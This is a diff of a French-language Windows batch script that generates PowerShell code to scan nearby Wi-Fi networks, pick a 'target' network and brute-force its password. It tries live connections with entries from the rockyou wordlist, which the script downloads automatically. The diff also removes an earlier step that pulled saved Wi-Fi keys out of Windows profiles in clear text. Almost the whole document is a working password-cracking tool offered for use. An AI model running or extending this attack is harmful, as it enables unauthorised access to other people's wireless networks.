@@ -1640,7 +1640,7 @@ echo %B%  ================================================%N%
 echo.
 echo  %C%[i] Scan en cours...%N%
 echo.
->> "%NWS%" echo Write-Host "  [>] Scan radio actif (WlanScan API)..." -f DarkGray
+>  "%NWS%" echo Write-Host "  [>] Scan radio actif (WlanScan API)..." -f DarkGray
 >> "%NWS%" echo $cs='using System;using System.Runtime.InteropServices;public class WD{[DllImport("wlanapi.dll")]public static extern uint WlanOpenHandle(uint v,IntPtr r,out uint n,out IntPtr h);[DllImport("wlanapi.dll")]public static extern uint WlanCloseHandle(IntPtr h,IntPtr r);[DllImport("wlanapi.dll")]public static extern uint WlanEnumInterfaces(IntPtr h,IntPtr r,out IntPtr l);[DllImport("wlanapi.dll")]public static extern uint WlanScan(IntPtr h,ref Guid g,IntPtr s,IntPtr d,IntPtr r);[DllImport("wlanapi.dll")]public static extern void WlanFreeMemory(IntPtr p);}'
 >> "%NWS%" echo try{Add-Type -TypeDefinition $cs -EA Stop}catch{}
 >> "%NWS%" echo $wh=[IntPtr]::Zero;$wn=[uint32]0
@@ -1665,8 +1665,8 @@ echo.
 >> "%NWS%" echo             if($c.Count){$r+=$c}
 >> "%NWS%" echo             $c=@{SSID=$matches[1].Trim();BSSID='';Signal='';Auth='';Cipher='';Channel=''}
 >> "%NWS%" echo         } elseif($l -match 'BSSID\s+\d+\s*:\s*(.+)'){$c.BSSID=$matches[1].Trim()}
->> "%NWS%" echo         elseif($l -match 'Signal\s*:\s*(.+)'){$c.Signal=$matches[1].Trim()}
->> "%NWS%" echo         elseif($l -match '\bauthentification\s*:\s*(.+)'){$c.Auth=$matches[1].Trim()}
+>> "%NWS%" echo         elseif(-not $c.Signal -and $l -match 'Signal\s*:\s*(.+)'){$c.Signal=$matches[1].Trim()}
+>> "%NWS%" echo         elseif(-not $c.Auth -and $l -match '\b(?:authentication^|authentification)\s*:\s*(.+)'){$c.Auth=$matches[1].Trim()}
 >> "%NWS%" echo         elseif($l -match '\bchiffrement\s*:\s*(.+)'){$c.Cipher=$matches[1].Trim()}
 >> "%NWS%" echo         elseif($l -match '^\s+Canal\s*:\s*(\d+)'){$c.Channel=$matches[1].Trim()}
 >> "%NWS%" echo     }
@@ -1675,58 +1675,80 @@ echo.
 >> "%NWS%" echo $nets=@(Parse-Nets(netsh wlan show networks mode=bssid 2^>$null))
 >> "%NWS%" echo $knownSSIDs=@($nets ^| ForEach-Object {$_.SSID})
 >> "%NWS%" echo $extra=@(Parse-Nets(netsh wlan show networks 2^>$null) ^| Where-Object {$knownSSIDs -notcontains $_.SSID})
->> "%NWS%" echo $nets=@($nets+$extra ^| Where-Object {$_.SSID})
+>> "%NWS%" echo $nets=@($nets+$extra ^| Where-Object {$_.SSID -and $_.SSID -notmatch '^DIRECT-'})
 >> "%NWS%" echo if($nets.Count){}
->> "%NWS%" echo $nets=@($nets ^| Where-Object {$_.SSID})
->> "%NWS%" echo Write-Host ("  "+("N").PadRight(3)+" "+("SSID").PadRight(30)+" "+("BSSID").PadRight(20)+" "+("Signal").PadRight(8)+" "+("Auth").PadRight(12)+" Chan") -f Cyan
->> "%NWS%" echo Write-Host ("  "+("-"*3)+" "+("-"*30)+" "+("-"*20)+" "+("-"*8)+" "+("-"*12)+" "+"-"*4) -f DarkGray
->> "%NWS%" echo $i=0
+>> "%NWS%" echo $nets=@($nets ^| Sort-Object -Property @{Expression={try{[int]($_.Signal.Replace([string][char]37,''))}catch{0}}; Descending=$true} ^| Select-Object -First 12)
+>> "%NWS%" echo Write-Host ("  "+("SSID").PadRight(40)+" "+("Signal").PadRight(8)+" Auth") -f Cyan
+>> "%NWS%" echo Write-Host ("  "+("-"*40)+" "+("-"*8)+" "+"-"*12) -f DarkGray
 >> "%NWS%" echo $out=@()
 >> "%NWS%" echo foreach($n in $nets){
->> "%NWS%" echo     $i++
->> "%NWS%" echo     $auth=$n.Auth -replace 'WPA2-Personnel','WPA2' -replace 'WPA2-Personal','WPA2' -replace 'WPA-Personnel','WPA' -replace 'WPA-Personal','WPA' -replace 'Ouvert','Open'
+>> "%NWS%" echo     $auth=$n.Auth -replace 'WPA2[\s-]+Perso\w+','WPA2' -replace 'WPA[\s-]+Perso\w+','WPA' -replace 'Ouvert','Open' -replace 'Open System','Open'
 >> "%NWS%" echo     $col=if($auth -match 'WPA2'){'Green'}elseif($auth -match 'WPA'){'Yellow'}elseif($auth -match 'WEP'){'Red'}else{'DarkGray'}
->> "%NWS%" echo     Write-Host ("  "+$i.ToString().PadRight(3)+" "+$n.SSID.PadRight(30)+" "+$n.BSSID.PadRight(20)+" "+$n.Signal.PadRight(8)+" "+$auth.PadRight(8)+" "+$n.Channel) -f $col
->> "%NWS%" echo     $out+=($i.ToString()+";"+$n.SSID+";"+$n.BSSID+";"+$n.Signal+";"+$n.Auth+";"+$n.Channel)
+>> "%NWS%" echo     $badChars = [char]34, [char]38, [char]60, [char]62, [char]124, [char]59
+>> "%NWS%" echo     $safeSSID = $n.SSID; foreach($c in $badChars){ $safeSSID = $safeSSID.Replace([string]$c, '') }
+>> "%NWS%" echo     $safeSignal=$n.Signal.Replace([string][char]37, '')
+>> "%NWS%" echo     Write-Host ("  "+$safeSSID.PadRight(40)+" "+$n.Signal.PadRight(8)+" "+$auth) -f $col
+>> "%NWS%" echo     $out+=($safeSSID+";"+$safeSignal+";"+$auth)
 >> "%NWS%" echo }
->> "%NWS%" echo $out ^| Out-File '%WIFI_SCAN%' -Encoding UTF8
+>> "%NWS%" echo $out ^| Set-Content '%WIFI_SCAN%' -Encoding ASCII
 >> "%NWS%" echo Write-Host ""
 >> "%NWS%" echo Write-Host ("  [i] "+$nets.Count+" reseau(x) detecte(s). Fichier: %WIFI_SCAN%") -f DarkGray
 powershell -NoProfile -ExecutionPolicy Bypass -File "%NWS%"
+set "ps_exit=%errorlevel%"
 if exist "%NWS%" del /f /q "%NWS%"
 echo.
-rem --- Selection directement sous le scan ---
-set "wifi_sel_opts="
-for /f "usebackq tokens=1-6 delims=;" %%A in ("%WIFI_SCAN%") do (
-    if "!wifi_sel_opts!"=="" (set "wifi_sel_opts=%%B~%%C  %%D  Ch:%%F") else (set "wifi_sel_opts=!wifi_sel_opts!;%%B~%%C  %%D  Ch:%%F")
+if not "%ps_exit%"=="0" goto wifi_scan_ps_error
+goto wifi_scan_selection
+:wifi_scan_ps_error
+echo  %R%ERREUR : Le scan Wi-Fi a echoue (code %ps_exit%).%N%
+echo  %Y%Verifiez que votre adaptateur Wi-Fi est active et visible.%N%
+echo.
+pause
+endlocal
+goto net_menu_wifi
+:wifi_scan_selection
+set /a wifi_count=0
+for /f "usebackq tokens=1-3 delims=;" %%A in ("%WIFI_SCAN%") do (
+    set /a wifi_count+=1
 )
-if "!wifi_sel_opts!"=="" (
-    echo  %R%[!] Aucun reseau detecte.%N%
-    pause >nul
+if %wifi_count%==0 (
+    echo  %R%Aucun reseau Wi-Fi detecte dans les environs.%N%
+    echo  %Y%Assurez-vous que le Wi-Fi est active et qu'il y a des reseaux proches.%N%
+    echo.
+    pause
     endlocal
     goto net_menu_wifi
 )
-set "wifi_sel_opts=!wifi_sel_opts!;[---];Retour"
+set "wifi_sel_opts="
+for /f "usebackq tokens=1-3 delims=;" %%A in ("%WIFI_SCAN%") do (
+    if "!wifi_sel_opts!"=="" (set "wifi_sel_opts=%%A~%%B  %%C") else (set "wifi_sel_opts=!wifi_sel_opts!;%%A~%%B  %%C")
+)
+set "wifi_sel_opts=!wifi_sel_opts!;[---];Rescan~Relancer le scan Wi-Fi;Retour"
 call :DynamicMenu "CHOISIR LE RESEAU CIBLE" "!wifi_sel_opts!" "NONUMS NOCLS"
 set "wifi_sel=%errorlevel%"
-if "!wifi_sel!"=="0" (
-    endlocal & set "WIFI_SCAN_FILE=%WIFI_SCAN%"
-    goto net_menu_wifi
-)
-set "wt_ssid=" & set "wt_bssid=" & set "wt_signal=" & set "wt_auth=" & set "wt_chan="
+if "!wifi_sel!"=="0" goto wifi_scan_retour
+set /a wifi_rescan_idx=wifi_count+1
+set /a wifi_retour_idx=wifi_count+2
+if "!wifi_sel!"=="!wifi_rescan_idx!" goto wifi_scan_rescan
+if "!wifi_sel!"=="!wifi_retour_idx!" goto wifi_scan_retour
+set "wt_ssid=" & set "wt_signal=" & set "wt_auth="
 set /a wifi_sel_line=0
-for /f "usebackq tokens=1-6 delims=;" %%A in ("%WIFI_SCAN%") do (
+for /f "usebackq tokens=1-3 delims=;" %%A in ("%WIFI_SCAN%") do (
     set /a wifi_sel_line+=1
     if "!wifi_sel_line!"=="!wifi_sel!" (
-        set "wt_ssid=%%B" & set "wt_bssid=%%C" & set "wt_signal=%%D" & set "wt_auth=%%E" & set "wt_chan=%%F"
+        set "wt_ssid=%%A" & set "wt_signal=%%B" & set "wt_auth=%%C"
     )
 )
-if "!wt_ssid!"=="" (
-    endlocal & set "WIFI_SCAN_FILE=%WIFI_SCAN%"
-    goto net_menu_wifi
-)
+if "!wt_ssid!"=="" goto wifi_scan_retour
 endlocal & set "WIFI_SCAN_FILE=%WIFI_SCAN%" & set "WIFI_TARGET_SSID=%wt_ssid%"
 goto net_wifi_crack
+:wifi_scan_rescan
+if exist "%WIFI_SCAN%" del /f /q "%WIFI_SCAN%"
+endlocal
+goto net_wifi_scan
+:wifi_scan_retour
+endlocal & set "WIFI_SCAN_FILE=%WIFI_SCAN%"
+goto net_menu_wifi
 
 :net_wifi_target
 goto net_wifi_scan
@@ -1746,29 +1768,44 @@ if "%WIFI_TARGET_SSID%"=="" (
 )
 echo.
 set "NWC=%TEMP%\net_wificrack_%RANDOM%.ps1"
-rem --- Etape 1 : verifier profil sauvegarde ---
->> "%NWC%" echo Write-Host "  [1/3] Verification profil sauvegarde Windows..." -f DarkGray
->> "%NWC%" echo $ssid='%WIFI_TARGET_SSID%'
->> "%NWC%" echo $key=netsh wlan show profile name=$ssid key=clear 2^>$null ^| Select-String 'Contenu de la cl^|Key Content'
->> "%NWC%" echo if($key){
->> "%NWC%" echo     $pwd=($key -replace '.*:\s*').Trim()
->> "%NWC%" echo     Write-Host "`r  [CRACK] Mot de passe trouve dans profil Windows : $pwd          " -f Red
->> "%NWC%" echo     Write-Host "  [i] Aucune attaque necessaire - cle extraite localement." -f Green
->> "%NWC%" echo     exit 0
->> "%NWC%" echo }
->> "%NWC%" echo Write-Host "`r  [--] Pas de profil local. Passage a l'attaque dictionnaire..." -f DarkGray
-rem --- Etape 2 : attaque dictionnaire par connexion reelle ---
->> "%NWC%" echo Write-Host "  [2/3] Attaque dictionnaire - connexion reelle (natif Windows)" -f DarkGray
->> "%NWC%" echo Write-Host "  [!] ~5 sec/tentative. Recommande : wordlist courte (top-500)." -f Yellow
->> "%NWC%" echo $wlFile=Read-Host "  Chemin vers la wordlist (.txt)"
->> "%NWC%" echo if(-not (Test-Path $wlFile)){Write-Host "  [!] Fichier introuvable." -f Red; exit 1}
->> "%NWC%" echo $words=[System.IO.File]::ReadAllLines($wlFile) ^| Where-Object {$_.Length -ge 8 -and $_.Length -le 63}
->> "%NWC%" echo Write-Host ("  [i] "+$words.Count+" mots valides (8-63 chars). Debut de l'attaque...") -f DarkGray
->> "%NWC%" echo $found=$false; $i=0; $total=$words.Count
->> "%NWC%" echo $tmpXml="$env:TEMP\wifitest_$([System.IO.Path]::GetRandomFileName()).xml"
->> "%NWC%" echo foreach($w in $words){
+set "WIFI_ROCKYOU=%~dp0rockyou.txt"
+>  "%NWC%" echo $ssid=[string]$env:WIFI_TARGET_SSID
+>> "%NWC%" echo netsh wlan delete profile name="$ssid" ^>$null 2^>$null
+>> "%NWC%" echo Write-Host ''
+>> "%NWC%" echo Write-Host '  [1/2] Preparation wordlist rockyou.txt...' -f Cyan
+>> "%NWC%" echo $wlFile="$env:WIFI_ROCKYOU"
+>> "%NWC%" echo foreach($loc in @("$env:WIFI_ROCKYOU","$env:USERPROFILE\rockyou.txt","$env:USERPROFILE\Downloads\rockyou.txt","$env:USERPROFILE\Desktop\rockyou.txt","C:\tools\rockyou.txt")){if(Test-Path $loc){$wlFile=$loc;break}}
+>> "%NWC%" echo if(-not (Test-Path $wlFile)){
+>> "%NWC%" echo     Write-Host '  [^>] rockyou.txt introuvable. Telechargement automatique (~134 MB)...' -f Yellow
+>> "%NWC%" echo     $url='https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt'
+>> "%NWC%" echo     try{
+>> "%NWC%" echo         Write-Host '  [^>] Telechargement en cours (~134 MB, 1-2 min)...' -f Yellow
+>> "%NWC%" echo         (New-Object System.Net.WebClient).DownloadFile($url,$wlFile)
+>> "%NWC%" echo         Write-Host '  [OK] Telechargement termine.' -f Green
+>> "%NWC%" echo     }catch{
+>> "%NWC%" echo         Write-Host "  [ERR] Echec telechargement : $_" -f Red
+>> "%NWC%" echo         Write-Host "  [i] Placez rockyou.txt dans le dossier du script." -f Yellow
+>> "%NWC%" echo         $null=Read-Host '  ENTREE pour continuer...'; exit 1
+>> "%NWC%" echo     }
+>> "%NWC%" echo }else{Write-Host "  [OK] Wordlist trouvee : $wlFile" -f Green}
+>> "%NWC%" echo Write-Host ''
+>> "%NWC%" echo Write-Host "  [2/2] Attaque dictionnaire sur reseau : $ssid" -f Cyan
+>> "%NWC%" echo Write-Host '  [i] Methode : connexion reelle Windows (~5 sec/essai)' -f DarkGray
+>> "%NWC%" echo Write-Host '  [i] Appuyez sur ECHAP pour interrompre.' -f DarkGray
+>> "%NWC%" echo Write-Host ''
+>> "%NWC%" echo $found=$false;$i=0;$t0=Get-Date
+>> "%NWC%" echo $tmpXml="$env:TEMP\wt_$([System.IO.Path]::GetRandomFileName()).xml"
+>> "%NWC%" echo Write-Host '  [i] Deconnexion initiale...' -f DarkGray
+>> "%NWC%" echo netsh wlan disconnect ^>$null 2^>$null
+>> "%NWC%" echo Start-Sleep -Seconds 3
+>> "%NWC%" echo $reader=[System.IO.StreamReader]::new($wlFile)
+>> "%NWC%" echo while($null -ne ($w=$reader.ReadLine())){
+>> "%NWC%" echo     if([Console]::KeyAvailable){$k=[Console]::ReadKey($true);if($k.Key -eq 'Escape'){Write-Host ''; Write-Host '  [--] Attaque interrompue par ECHAP.' -f Yellow; break}}
+>> "%NWC%" echo     if($w.Length -lt 8 -or $w.Length -gt 63){continue}
 >> "%NWC%" echo     $i++
->> "%NWC%" echo     Write-Host "`r  [>] ($i/$total) Test : $w          " -NoNewline -f DarkGray
+>> "%NWC%" echo     $el=[math]::Round(((Get-Date)-$t0).TotalMinutes,1)
+>> "%NWC%" echo     Write-Host "`r  [>>] Essai #$i : $w | Ecoule:${el}min    " -NoNewline -f DarkGray
+>> "%NWC%" echo     netsh wlan disconnect ^>$null 2^>$null
 >> "%NWC%" echo     $x='^<?xml version="1.0"?^>'
 >> "%NWC%" echo     $x+='^<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"^>'
 >> "%NWC%" echo     $x+='^<name^>'+$ssid+'^</name^>'
@@ -1784,30 +1821,36 @@ rem --- Etape 2 : attaque dictionnaire par connexion reelle ---
 >> "%NWC%" echo     $x+='^<keyMaterial^>'+$w+'^</keyMaterial^>^</sharedKey^>'
 >> "%NWC%" echo     $x+='^</security^>^</MSM^>^</WLANProfile^>'
 >> "%NWC%" echo     $x ^| Out-File $tmpXml -Encoding UTF8
->> "%NWC%" echo     netsh wlan add profile filename=$tmpXml ^>$null 2^>$null
->> "%NWC%" echo     netsh wlan connect name=$ssid ssid=$ssid ^>$null 2^>$null
->> "%NWC%" echo     Start-Sleep -Seconds 4
->> "%NWC%" echo     $st=netsh wlan show interfaces ^| Select-String 'Etat^|State'
->> "%NWC%" echo     if($st -match 'connect'){
->> "%NWC%" echo         Write-Host "`r  [CRACK] MOT DE PASSE TROUVE : $w          " -f Red
->> "%NWC%" echo         $found=$true
->> "%NWC%" echo         netsh wlan disconnect ^>$null 2^>$null
->> "%NWC%" echo         break
+>> "%NWC%" echo     netsh wlan add profile filename="$tmpXml" ^>$null 2^>$null
+>> "%NWC%" echo     netsh wlan connect name="$ssid" ssid="$ssid" ^>$null 2^>$null
+>> "%NWC%" echo     $ok=$false;$t2=0
+>> "%NWC%" echo     while($t2 -lt 20){
+>> "%NWC%" echo         Start-Sleep -Seconds 1;$t2++
+>> "%NWC%" echo         $st=[string](netsh wlan show interfaces ^| Where-Object{$_ -match 'Etat^|State'} ^| Select-Object -First 1)
+>> "%NWC%" echo         $st=($st -replace '.*:\s*').Trim()
+>> "%NWC%" echo         if($st -match '^^connect[^^i]'){$ok=$true;break}
+>> "%NWC%" echo         if($t2 -ge 8 -and $st -notmatch 'connect'){break}
 >> "%NWC%" echo     }
->> "%NWC%" echo     netsh wlan delete profile name=$ssid ^>$null 2^>$null
+>> "%NWC%" echo     if($ok){
+>> "%NWC%" echo         Write-Host ''
+>> "%NWC%" echo         Write-Host '  ============================================' -f Green
+>> "%NWC%" echo         Write-Host "  [CRACK] MOT DE PASSE TROUVE : $w" -f Green
+>> "%NWC%" echo         Write-Host '  ============================================' -f Green
+>> "%NWC%" echo         $found=$true; netsh wlan disconnect ^>$null 2^>$null; break
+>> "%NWC%" echo     }
+>> "%NWC%" echo     netsh wlan delete profile name="$ssid" ^>$null 2^>$null
 >> "%NWC%" echo }
+>> "%NWC%" echo $reader.Close()
 >> "%NWC%" echo if(Test-Path $tmpXml){Remove-Item $tmpXml -Force}
->> "%NWC%" echo if(-not $found){Write-Host "`r  [--] Mot de passe non trouve dans la wordlist ($i tentatives).          " -f DarkGray}
->> "%NWC%" echo Write-Host ""
->> "%NWC%" echo Write-Host "  === ALTERNATIVE : HASHCAT ===" -f Cyan
->> "%NWC%" echo $hc=Get-Command hashcat.exe -EA SilentlyContinue
->> "%NWC%" echo if($hc){Write-Host ("  hashcat -m 22000 capture.hc22000 "+$wlFile+" --force") -f Yellow}
->> "%NWC%" echo else{Write-Host "  hashcat non installe. Pour crack rapide (GPU) : https://hashcat.net" -f DarkGray}
->> "%NWC%" echo Write-Host "  Capturer handshake : hcxdumptool / airodump-ng (Linux/Kali)" -f DarkGray
+>> "%NWC%" echo Write-Host ''
+>> "%NWC%" echo if(-not $found){Write-Host "  [--] Non trouve apres $i tentatives. Wordlist insuffisante." -f DarkGray}
+>> "%NWC%" echo Write-Host '  Appuyez sur ENTREE pour revenir au menu...' -f Yellow
+>> "%NWC%" echo $null=Read-Host
 powershell -NoProfile -ExecutionPolicy Bypass -File "%NWC%"
+set "crack_exit=%errorlevel%"
 if exist "%NWC%" del /f /q "%NWC%"
 echo.
-pause >nul
+echo.
 endlocal
 goto net_menu_wifi
 
